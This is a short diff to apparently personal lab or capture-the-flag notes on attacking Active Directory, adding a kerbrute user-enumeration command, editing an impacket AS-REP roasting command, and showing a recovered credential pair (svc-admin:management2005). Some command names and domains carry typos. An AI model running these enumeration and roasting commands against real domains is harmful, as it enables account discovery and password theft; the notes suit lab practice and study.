@@ -4,13 +4,17 @@ Userenumeration with kerbrute (all users)
 -------------------------------
 ./kerbrute userenum --dc spookysec.local -d spookysec.local /usr/share/wordlists/rockyou.txt
 
+Userenumeration with /bin/kerbrute without domain controller
+-----------------------------------------------------------
+#kerbrute userenum -d hq.vanguard.local /usr/share/wordlists/rockyou.txt
+
 cut the space (" ") till 8 fields
 -----------------------------------
 cut -d " " -f 8 x.txt > valid_username.txt
 
 AS-REP roasting
 ----------------
-impacket-GetNpusers spookey.sec --no-pass -userfile valid_username.txt
+impacket-GetNpusers spookey.sec -no-pass -usersfile valid_username.txt
 
 svc-admin:management2005
 
